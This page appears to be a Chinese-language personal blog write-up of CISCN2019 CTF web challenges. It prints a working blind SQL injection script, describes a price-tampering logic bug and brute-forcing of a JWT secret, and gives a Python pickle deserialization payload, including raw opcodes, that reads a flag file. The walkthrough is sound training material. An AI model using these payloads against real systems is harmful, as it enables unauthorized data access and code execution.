@@ -1,0 +1,125 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="CISCN2019"><meta name="keywords" content="sql注入,python,序列化"><meta name="author" content="Neorah"><meta name="copyright" content="Neorah"><title>CISCN2019 | Neorah's Blog</title><link rel="shortcut icon" href="/img/melody-favicon32.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: {"appId":"DBINOT6FYU","apiKey":"c8bb9d887053d084aa4aee885c26cac5","indexName":"dev_Neorah","hits":{"per_page":10},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
+  localSearch: undefined,
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  }
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Hack-World"><span class="toc-number">1.</span> <span class="toc-text">Hack World</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ikun"><span class="toc-number">2.</span> <span class="toc-text">ikun</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#逻辑漏洞"><span class="toc-number">2.1.</span> <span class="toc-text">逻辑漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie伪造"><span class="toc-number">2.2.</span> <span class="toc-text">cookie伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python反序列化漏洞"><span class="toc-number">2.3.</span> <span class="toc-text">Python反序列化漏洞</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/neorah.jpg"></div><div class="author-info__name text-center">Neorah</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Neorah" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">32</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">33</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">34</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/top.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Neorah's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Posts</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">CISCN2019</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-07-08</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/python/">python</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E4%BC%AA%E9%80%A0cookie/">伪造cookie</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/">sql注入</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/sql%E6%B3%A8%E5%85%A5/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/">布尔盲注</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a><i class="fa fa-angle-right" aria-hidden="true"></i><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/%E5%BA%8F%E5%88%97%E5%8C%96/">序列化</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">1.2k</span><span class="post-meta__separator">|</span><span>Reading time: 4 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="Hack-World"><a href="#Hack-World" class="headerlink" title="Hack World"></a>Hack World</h1><p>这道题做得我心态有点崩，因为明明很简单但我脚本跑下来就是这样</p>
+<img src="/CISCN2019/1.png" class="">
+
+<p>关键我觉得我脚本没问题啊 5555</p>
+<p>这道题比较简单，select,if,ascii什么的都没有过滤，可以通过异或运算来得到数据库中的内容</p>
+ <img src="/CISCN2019/2.png" class="">
+
+<p>而且它已经给了表名和字段名惹</p>
+<p>好了可以了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://dc106d56-83ef-49ed-9e96-d1cb8ef5060e.node3.buuoj.cn/index.php'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">"0^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        data = &#123;<span class="string">"id"</span>: payload1.format(i, mid)&#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Hello'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>对了对了这里有个地方我一直忽略了</p>
+<p>在脚本里payload是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;0^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&gt;&#123;1&#125;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我一开始写的是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;1^(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))&lt;&#123;1&#125;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>结果跑出来是这样</p>
+ 
+
+<p>但是我变成第一种就能跑出来flag，我就开始疑惑了</p>
+<p>星星一看就说</p>
+ <img src="/CISCN2019/4.png" class="">
+
+<p>好的是我蠢了5555我都没看出来</p>
+<p>所以应该写成&lt;=才行，突然发现我以前也在这个问题上犯过错误。好了这次记住了。</p>
+<h1 id="ikun"><a href="#ikun" class="headerlink" title="ikun"></a>ikun</h1> <img src="/CISCN2019/5.png" class="">
+
+<p>我看不懂了 这题是黑坤坤的吗</p>
+<p>我真的挺喜欢坤坤的 我有个姐妹是他的忠实粉丝 自从我姐妹跟我安利过他以后我也觉得他真的特别棒！特别是看了一点青你2更是被他圈粉了 好有素养一男的 多了解了解坤坤真的知道他挺棒的 不容易</p>
+<p>好了 好好做题8</p>
+<p>这道题的知识点还蛮多的！但是最后那个反序列化我没有做出来555 不过学到惹</p>
+<ul>
+<li>逻辑漏洞（</li>
+<li>cookie伪造</li>
+<li>python反序列化</li>
+</ul>
+<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><p>让我们先来注册一个账号然后登陆：</p>
+ <img src="/CISCN2019/6.png" class="">
+
+<p>看起来修改密码处无漏洞。看了一下大概就是可以用剩余金额购买首页的商品。</p>
+ <img src="/CISCN2019/7.png" class="">
+
+<p>源码说</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--这题脑洞确实有点大,所以我们留了些hint,请注意!--&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我猜那句<code>ikun们冲鸭,一定要买到lv6!!!</code>是提示。于是我找了下lv6，翻了好几页都没有翻到。</p>
+<p>并且这个页数还很多？一直到100页都还有。</p>
+<p>我一度怀疑不存在lv6，但这样的话这句提示就没有用了鸭。</p>
+<p>所以写个脚本找下lv6：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://61ea8d3f-56ba-43c6-9aed-be2ecebfae5f.node3.buuoj.cn/shop?page='</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    r = requests.get(url + str(i))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"lv6.png"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>找到惹，在181页。</p>
+ <img src="/CISCN2019/8.png" class="">
+
+<p>但这价钱也太贵了8。不过还好在刚登陆上找线索的时候就发现了个逻辑洞（pentest习惯</p>
+<p>可以直接F12更改折扣</p>
+ <img src="/CISCN2019/9.png" class="">
+
+<p>果然，进入了不一样的页面</p>
+ <img src="/CISCN2019/10.png" class="">
+
+<p>所以就进入下一个阶段惹</p>
+<h2 id="cookie伪造"><a href="#cookie伪造" class="headerlink" title="cookie伪造"></a>cookie伪造</h2><p>上一阶段很明显说了需要admin才能访问。看了看cookie</p>
+ <img src="/CISCN2019/11.png" class="">
+
+<p>jwt都很熟悉了8，jwt.io解码看看</p>
+ <img src="/CISCN2019/12.png" class="">
+
+<p>并且我没找到源码。所以尝试爆破一下。</p>
+<p>（这个地方我联系了下之前做的HFCTF中的一道题，返回去看才终于知道为什么当时可以将argorithm置为空来绕过了。并且已经把原因加在那篇文章中了。</p>
+<p><a href="https://xz.aliyun.com/t/6776" target="_blank" rel="noopener">这篇文章</a>讲了一些攻击JWT的方法！我觉得很好！</p>
+<p>好了回归这道题。</p>
+ <img src="/CISCN2019/13.png" class="">
+
+<p>这里的加密算法使用了HS256，因此可以尝试爆破惹。</p>
+<p>项目地址：<a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+ <img src="/CISCN2019/14.png" class="">
+
+<p>得到密钥为<code>1Kun</code>.</p>
+ <img src="/CISCN2019/15.png" class="">
+
+<p>替换后页面变了</p>
+ <img src="/CISCN2019/16.png" class="">
+
+<p>在这个页面下载到了源码。打开康康。</p>
+<h2 id="Python反序列化漏洞"><a href="#Python反序列化漏洞" class="headerlink" title="Python反序列化漏洞"></a>Python反序列化漏洞</h2><p>打开源码有一些重要的文件</p>
+ <img src="/CISCN2019/17.png" class="">
+
+<p>在admin.py下出现了反序列化漏洞点 </p>
+<img src="/CISCN2019/18.png" class="">
+
+<p>我终于懂python反序列化了 落泪</p>
+<p>在这里给出几篇讲得很好的文章：</p>
+<p> <a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 Python 反序列化漏洞</a></p>
+<p><a href="https://checkoway.net/musings/pickle/" target="_blank" rel="noopener">Arbitrary code execution with Python pickles</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html" target="_blank" rel="noopener">掌阅iReader某站Python漏洞挖掘</a></p>
+<p> <a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">Code-Breaking中的两个Python沙箱</a></p>
+<p><a href="https://xz.aliyun.com/t/2289" target="_blank" rel="noopener">Python反序列化漏洞的花式利用</a></p>
+<p>本题脚本</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">payload</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span><span class="params">(self)</span>:</span></span><br><span class="line">        a = <span class="string">"open('/flag.txt','r').read()"</span></span><br><span class="line">        <span class="keyword">return</span> eval, (a,)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>
+
+<p>然后抓包通过become传过去就可以了。</p>
+<p>顺便…用Python3跑也是可以的，只不过需要自己url encoding了</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c__builtin__%0Aeval%0Ap0%0A%28Vopen%28%27%2Fflag.txt%27%29.read%28%29%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
+
+<p>再顺便…</p>
+<p>项目地址：<a href="https://github.com/EddieIvan01/pker" target="_blank" rel="noopener">https://github.com/EddieIvan01/pker</a></p>
+<p>可以借助这个脚本写opcode，因为reduce如果被过滤了就不能像上面那样写了。</p>
+<p>具体用法：<a href="https://xz.aliyun.com/t/7436#toc-13" target="_blank" rel="noopener">pickle反序列化初探</a></p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Neorah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://neorah.me/CISCN2019/">https://neorah.me/CISCN2019/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="noopener">CC BY-NC-SA 3.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/sql%E6%B3%A8%E5%85%A5/">sql注入</a><a class="post-meta__tags" href="/tags/python/">python</a><a class="post-meta__tags" href="/tags/%E5%BA%8F%E5%88%97%E5%8C%96/">序列化</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/pentest/domain-collect/"><span>子域名收集工具记录</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/top.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Neorah</div><div class="footer_custom_text">Theme By melody</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
+  $('#nav').addClass('is-mobile')
+  $('footer').addClass('is-mobile')
+  $('#top-container').addClass('is-mobile')
+}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>
